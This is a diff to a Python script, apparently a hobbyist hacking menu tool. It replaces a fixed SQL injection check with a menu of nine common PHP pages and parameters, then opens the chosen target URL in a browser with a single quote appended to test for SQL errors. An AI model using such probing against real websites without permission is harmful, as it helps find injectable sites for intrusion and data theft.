@@ -39,18 +39,88 @@ def sqlmx():
    print("\u001b[0m ")
    target=str(input("WRITE TARGET URL: "))
    print("\u001b[0m ")
-   print("[*] IF YOU SEE A SQL SYNTAX ERROR")
-   os.system('sleep 2')
-   print("[*] THAT NOTICES YOU A VULNERABILITY")
+   print("\u001b[33m[*] SELECT A CODE TO INJECTION")
    print(" ")
+   print("\u001b[0m[1] index.php?id=")
+   print("[2] files.php?id=")
+   print("[3] shop.php?id=")
+   print("[4] buy.php?category=")
+   print("[5] trainers.php?id=")
+   print("[6] games.php?id=")
+   print("[7] page.php?file=")
+   print("[8] gallery.php?id=")
+   print("[9] show.php?id=")
+   print(" ")
+   inject=int(input("SELECT YOUR CODE: "))
    print("\u001b[31m///////////////////////////////////")
+   print("\u001b[32m ")
+   print("[*] INJECTING CODE...")
    os.system('sleep 2')
-   try:
-       inject="/index.php?id='"
-       webbrowser.open((target+inject))
-   except KeyboardInterrupt:
-       screen()
-       select()
+   if(inject==1):
+     try:
+         inject="/index.php?id='"
+         webbrowser.open((target+inject))
+     except KeyboardInterrupt:
+         screen()
+         select()
+   elif(inject==2):
+     try:
+         inject="/files.php?id='"
+         webbrowser.open((target+inject))
+     except KeyboardInterrupt:
+         screen()
+         select()
+   elif(inject==3):
+     try:
+         inject="/shop.php?id='"
+         webbrowser.open((target+inject))
+     except KeyboardInterrupt:
+         screen()
+         select()
+   elif(inject==4):
+     try:
+         inject="/buy.php?category='"
+         webbrowser.open((target+inject))
+     except KeyboardInterrupt:
+         screen()
+         select()
+   elif(inject==5):
+     try:
+         inject="/trainers.php?id='"
+         webbrowser.open((target+inject))
+     except KeyboardInterrupt:
+         screen()
+         select()
+   elif(inject==6):
+     try:
+         inject="/games.php?id='"
+         webbrowser.open((target+inject))
+     except KeyboardInterrupt:
+         screen()
+         select()
+   elif(inject==7):
+     try:
+         inject="/page.php?file='"
+         webbrowser.open((target+inject))
+     except KeyboardInterrupt:
+         screen()
+         select()
+   elif(inject==8):
+     try:
+         inject="/gallery.php?id='"
+         webbrowser.open((target+inject))
+     except KeyboardInterrupt:
+         screen()
+         select()
+   elif(inject==9):
+     try:
+         inject="/show.php?id='"
+         webbrowser.open((target+inject))
+     except KeyboardInterrupt:
+         screen()
+         select()
+   else:
+     print("\u001b[31m[*] WRONG OPTION...")
 #UPDATE AREA...
 def update():
    try:
